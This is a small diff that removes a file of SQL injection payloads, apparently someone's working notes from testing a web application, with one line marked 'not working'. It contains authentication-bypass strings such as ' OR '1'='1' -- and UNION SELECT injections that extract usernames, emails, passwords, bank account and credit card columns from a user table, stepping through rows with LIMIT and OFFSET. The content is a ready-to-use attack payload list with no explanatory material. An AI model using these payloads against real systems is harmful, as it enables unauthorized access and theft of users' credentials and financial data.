@@ -1,9 +1,0 @@
-' OR '1'='1' -- 
-' OR 1=1 -- 
-' OR '1'='1' -- 
-' OR "1"="1" -- 
-' OR '1'='1' # 
-' UNION SELECT NULL, username, email, password, bank_account, credit_card FROM user --  => not working
-' UNION SELECT 1, username, email, password, bank_account, credit_card FROM user -- 
-' UNION SELECT id, username, email, password, bank_account, credit_card FROM user LIMIT 1 OFFSET 1 -- 
-' UNION SELECT id, username, email, password, bank_account, credit_card FROM user WHERE id > 1 LIMIT 1 -- 
